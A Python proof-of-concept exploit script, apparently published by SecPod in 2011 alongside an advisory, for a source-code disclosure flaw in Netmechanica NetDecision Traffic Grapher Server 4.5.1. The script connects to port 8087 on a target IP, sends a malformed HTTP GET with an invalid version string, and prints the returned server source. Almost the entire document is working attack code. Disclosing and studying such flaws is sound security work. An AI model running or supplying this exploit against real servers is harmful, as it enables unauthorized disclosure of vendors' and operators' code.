#!/usr/bin/python
##############################################################################
#
# Title    : Netmechanica NetDecision Traffic Grapher Server Information 
#            Disclosure  Vulnerability
# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
# Vendor   : http://www.netmechanica.com
# Advisory : http://secpod.org/blog/?p=481
#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt
#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py
# Software : Netmechanica NetDecision Traffic Grapher Server version 4.5.1
# Date     : 06/12/2011
#
###############################################################################

import socket,sys,time


if len(sys.argv) < 2:
        print "\t[-] Usage: python SecPod_Exploit_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc.py target_ip"
        print "\t[-] Example : python SecPod_Exploit_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc.py 127.0.0.1"
        print "\t[-] Exiting..."
        sys.exit(0)

port   = 8087
target = sys.argv[1]

try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)

try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,port))
    time.sleep(1)
except:
    print "socket() failed"
    sys.exit(1)

exploit = "GET " + "/test.nd" + " HTTP/-1111111"+"\r\n\r\n"

print "HTTP GET request for /default.nd with invalid HTTP version triggers"+\
       " the vulnerability"

data = exploit
sock.sendto(data, (target, port))

for i in range(1,10):
    sock.sendto("\r\n",(target, port))
    time.sleep(1)

time.sleep(10)
res = sock.recv(10000)
sock.close()
print "[+] Source Code of Netdecision Traffice Grapher Server : \r\n"
print res
sys.exit(1)
